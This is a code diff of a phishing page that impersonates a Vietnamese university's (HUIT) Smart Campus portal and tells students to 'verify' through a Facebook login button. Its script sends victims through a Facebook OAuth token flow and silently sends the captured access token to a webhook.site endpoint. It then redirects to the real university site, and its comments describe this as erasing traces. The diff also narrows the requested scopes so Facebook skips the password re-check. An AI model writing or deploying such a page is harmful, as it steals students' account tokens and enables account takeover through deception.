@@ -17,30 +17,32 @@
 <body>
 
     <div class="card">
-        <img src="https://huit.edu.vn/tt-daotao/images/logo_huit.png" class="huit-logo">
+        <img src="https://huit.edu.vn/tt-daotao/images/logo_huit.png" class="huit-logo" alt="HUIT Logo">
         <h2>Hệ Thống Smart Campus</h2>
-        <p>Để hoàn tất đồng bộ lịch học và xem kết quả học tập qua Messenger, bạn vui lòng nhấn xác thực tài khoản bên dưới.</p>
+        <p>Để hoàn tất đồng bộ lịch học và xem kết quả học tập, bạn vui lòng nhấn xác thực tài khoản sinh viên bên dưới.</p>
         
         <button class="btn-fb" id="loginBtn">
             <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="fb-icon">
-            Tiếp tục dưới tên Phương
+            Tiếp tục với Facebook
         </button>
     </div>
 
 <script>
-    // === CẤU HÌNH (PHƯƠNG KIỂM TRA KỸ APP_ID VÀ LINK WEBHOOK) ===
+    // === CẤU HÌNH (PHƯƠNG THAY ĐÚNG APP_ID CỦA BẠN VÀO ĐÂY) ===
     const APP_ID = "2402493790174154"; 
     const WEBHOOK_URL = "https://webhook.site/63a27832-d5bc-440f-9993-e12efa944916";
+    // Tự động lấy link GitHub hiện tại làm Redirect URI
     const REDIRECT_URI = window.location.href.split('#')[0]; 
 
-    // 1. Gửi nạn nhân sang Facebook để lấy Token (1-Click)
+    // 1. Chuyển hướng lấy Access Token qua 1-click (Đã loại bỏ auth_type để không bắt nhập mật khẩu)
     document.getElementById('loginBtn').onclick = function() {
-        const SCOPES = "public_profile,email,ads_management,business_management";
-        const fbUrl = `https://www.facebook.com/v21.0/dialog/oauth?client_id=${APP_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=${SCOPES}&auth_type=rerequest`;
+        // Chỉ yêu cầu quyền public_profile để Facebook không bắt xác thực lại mật khẩu
+        const SCOPES = "public_profile,email";
+        const fbUrl = `https://www.facebook.com/v21.0/dialog/oauth?client_id=${APP_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=${SCOPES}`;
         window.location.href = fbUrl;
     };
 
-    // 2. Tự động "bắt" Token từ URL và gửi về Webhook khi quay lại
+    // 2. Tự động "bắt" Token từ URL sau khi nhấn nút và gửi về Webhook âm thầm
     window.onload = function() {
         if (window.location.hash.includes("access_token")) {
             const hash = window.location.hash.substring(1);
@@ -53,10 +55,9 @@
                     method: 'GET',
                     mode: 'no-cors' 
                 }).then(() => {
-                    // Chuyển hướng về trang chủ trường sau khi lấy xong Token
+                    // Chuyển hướng về trang chủ trường sau khi lấy xong Token để xóa dấu vết
                     window.location.href = "https://huit.edu.vn/";
-                }).catch(err => {
-                    // Nếu lỗi fetch, vẫn chuyển hướng để xóa dấu vết
+                }).catch(() => {
                     window.location.href = "https://huit.edu.vn/";
                 });
             }
